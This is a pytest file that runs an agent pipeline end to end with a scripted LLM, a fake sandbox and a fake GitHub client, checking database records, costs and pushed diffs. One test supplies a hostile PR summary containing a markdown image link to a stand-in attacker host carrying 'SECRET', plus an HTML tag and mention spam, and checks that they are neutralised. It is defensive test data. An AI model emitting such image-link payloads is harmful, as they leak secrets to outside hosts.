"""The real agent inside `run_task`: the real graph, the real toolbox, the real gateway client.

The other pipeline tests drive `run_task` with a scripted `AgentRunner`, which proves the pipeline's
half. This file proves the join. What runs for real: the LangGraph graph (`run_agent`), its prompts and
feedback filter, the nine tools wired by `build_tool_context` to a real clone, the gateway client's
pricing, budget and recorder (writing `llm_calls` into the test database), the scorer, the gate, the
squash, the push to a real bare remote and every database write. What is faked, because it cannot run
here: the provider (`litellm.acompletion`, scripted), the sandbox (the shared `FakeBackend`) and GitHub
(`FakeGithubClient`).

A test here is only worth having if it would fail when the wiring is wrong, so the assertions are on
what the *model was shown* and what ended up in the *database and on the remote*, not on what the
script did.
"""

import json
import re
from decimal import Decimal

import pytest
from sqlalchemy import select

import repolace_pipeline.agent_runner as agent_runner_module
import repolace_pipeline.run as run_module
from harness.report import build_report
from repolace_gateway.budget import TaskBudget
from repolace_shared.db.models import LLMCall, RegisteredRepo, Task, TaskOutcome, TaskStatus
from repolace_shared.git import agent_branch_name
from repolace_shared.instances import dump_instance
from retrieval.query import build_query
from verify.protocol import ScriptResult, SuiteResult
from verify.testing import FakeBackend

from repolace_agents.contracts import StopReason
from repolace_pipeline.agent_runner import LLMAgent
from repolace_pipeline.run import RunResult, run_task

from pipeline_llm_support import MODEL_NAME, REPLY_COST, ScriptedProvider, call, make_client, reply
from pipeline_support import (
    FakeGithubClient,
    git,
    local_workspace_factory,
    make_instance,
    reload,
    seed_task,
)

pytestmark = [pytest.mark.anyio, pytest.mark.db, pytest.mark.usefixtures("embedder")]

VISIBLE = "tests/test_app.py::test_parse_config_reads_pairs"
OTHER = "tests/test_app.py::test_other"
HIDDEN = "tests/test_hidden.py::test_empty_config"
COLLECTED = ("tests/test_app.py",)
BENCH_COLLECTED = ("tests/test_app.py", "tests/test_hidden.py")

DOCSTRING = '"""Parse the key=value config file at path into a dict."""'
FIXED = '"""Parse the key=value config file at path into a dict. An empty file gives an empty dict."""'
BROKEN = '"""BROKEN"""'

#: A live-issue baseline with one red test, which the attempt turns green: scored PASSED (uncurated).
RED_BASELINE = SuiteResult(passed=(OTHER,), failed=(VISIBLE,), collected_files=COLLECTED)
GREEN_AFTER = SuiteResult(passed=(OTHER, VISIBLE), collected_files=COLLECTED)

#: The benchmark versions: the curated test is red at the base commit because the overlay is on disk.
BENCH_BASELINE = SuiteResult(passed=(VISIBLE,), failed=(HIDDEN,), collected_files=BENCH_COLLECTED)
BENCH_AFTER = SuiteResult(passed=(VISIBLE, HIDDEN), collected_files=BENCH_COLLECTED)


def edit_docstring(old: str, new: str):
    return call("edit_file", path="src/app.py", old_string=old, new_string=new)


async def run_real(
    factory, origin_url, task, provider, backend, *, github=None, config=None, **kwargs
) -> tuple[RunResult, FakeGithubClient]:
    """`run_task` with the real runner and a real client over `provider`: what `--agent llm` builds."""
    github = github if github is not None else FakeGithubClient()
    result = await run_task(
        task.id,
        factory,
        github,
        backend,
        agent=LLMAgent(),
        llm=make_client(factory, provider, config=config),
        workspace_factory=local_workspace_factory(origin_url),
        embedder_warmup=lambda: None,
        **kwargs,
    )
    return result, github


async def llm_rows(factory, task_id) -> list[LLMCall]:
    async with factory() as session:
        rows = await session.execute(select(LLMCall).where(LLMCall.task_id == task_id).order_by(LLMCall.created_at))
        return list(rows.scalars())


def happy_script():
    """search, read, edit, run the tests, submit: the loop the prompt asks for."""
    return [
        reply(call("search_code", query="parse_config empty file")),
        reply(call("read_file", path="src/app.py")),
        reply(edit_docstring(DOCSTRING, FIXED)),
        reply(call("run_tests", targets=["tests/test_app.py"])),
        reply(call("submit", summary="Document that an empty file gives an empty dict.")),
    ]


class TestTheHappyPathThroughTheRealGraph:
    @pytest.fixture
    async def happy(self, db_session, db_session_factory, origin_url, origin):
        task = await seed_task(db_session)
        provider = ScriptedProvider(happy_script())
        backend = FakeBackend(results=[RED_BASELINE, SuiteResult(passed=(OTHER, VISIBLE), collected_files=COLLECTED), GREEN_AFTER])
        result, github = await run_real(db_session_factory, origin_url, task, provider, backend)
        row, runs = await reload(db_session_factory, task.id)
        return task, result, github, row, runs, provider, backend, origin

    async def test_the_whole_row_is_written(self, happy):
        task, result, github, row, runs, provider, _, _ = happy

        assert result.status is row.status is TaskStatus.PR_OPENED, "a PR was opened, which is the success state"
        assert row.error_message is None
        assert row.outcome is TaskOutcome.PASSED and result.outcome is TaskOutcome.PASSED
        assert row.agent_stop_reason == "submitted" and row.retry_count == 0
        assert [r.attempt for r in runs] == [0, 1], "the probe is not a scored run"
        assert row.changed_files == ["src/app.py"]
        assert FIXED in row.patch_diff
        assert re.fullmatch(r"[0-9a-f]{40}", row.patch_sha)
        assert row.score_reason and "uncurated" in row.score_reason, "a live issue has no curated list"
        assert provider.unused == 0, "every scripted reply was used: the loop ended where the script did"

    async def test_the_cost_is_what_the_gateway_recorded_and_every_call_names_the_task(self, happy, db_session_factory):
        task, _, _, row, _, _, _, _ = happy

        calls = await llm_rows(db_session_factory, task.id)

        assert len(calls) == 5 and all(c.task_id == task.id for c in calls)
        assert {c.model for c in calls} == {MODEL_NAME}
        assert all(c.cost_usd == Decimal(REPLY_COST) for c in calls)
        assert row.cost_usd == sum((c.cost_usd for c in calls), Decimal(0)) == Decimal("0.0030")

    async def test_the_pr_is_the_pushed_branch_and_its_diff_is_the_recorded_patch(self, happy):
        task, result, github, row, _, _, _, origin = happy
        branch = agent_branch_name(7, task.id)

        (pull,) = github.pull_requests
        assert (pull["head"], pull["base"]) == (branch, "main")
        assert git(origin, "rev-parse", f"refs/heads/{branch}") == row.patch_sha, "the sha on the row is what was pushed"
        assert git(origin, "rev-list", "--count", f"main..{branch}") == "1", "squashed to a single commit"
        assert git(origin, "diff", f"main...{branch}").strip() == row.patch_diff.strip(), "the patch is the pushed diff"
        assert f"| model | `{MODEL_NAME}` |" in pull["body"], "the model is read from the task's own llm_calls"

    async def test_the_pr_body_quotes_the_summary_and_neutralises_what_would_notify_someone(
        self, db_session, db_session_factory, origin_url
    ):
        task = await seed_task(db_session)
        hostile = "Fixes django/django#123, thanks @someone ![x](https://evil.example/p.png?d=SECRET) <img src=//e>"
        script = happy_script()[:-1] + [reply(call("submit", summary=hostile))]
        backend = FakeBackend(results=[RED_BASELINE, GREEN_AFTER, GREEN_AFTER])

        _, github = await run_real(db_session_factory, origin_url, task, ScriptedProvider(script), backend)

        (pull,) = github.pull_requests
        body = pull["body"]
        assert "@someone" not in body, "a mention is broken so it pings nobody"
        assert not re.search(r"(?i)(fixes|closes|resolves)\s+\S*#\d", body)
        assert "![x](" not in body and "<img" not in body.replace("`", ""), "no live image or HTML"
        assert "https://evil.example/p.png" not in body.split("```")[0], "outside the quoted block there is no link"

    async def test_the_agent_was_shown_the_issue_as_data_and_retrieval_found_the_code(self, happy):
        _, _, _, _, _, provider, _, _ = happy

        first = provider.request_text(0)

        assert "parse_config crashes on an empty config file" in first, "the issue title reached the prompt"
        assert "src/app.py" in first, "the retrieved snippet reached the prompt"

    async def test_the_probe_ran_in_the_sandbox_without_being_scored(self, happy):
        _, _, _, _, runs, provider, backend, _ = happy

        assert len(backend.runs) == 3, "baseline, one probe, one scored attempt"
        probe_shown = [r for r in provider.tool_results() if "passed" in r]
        assert probe_shown, "the model saw the probe's result"
        assert [r.attempt for r in runs] == [0, 1]
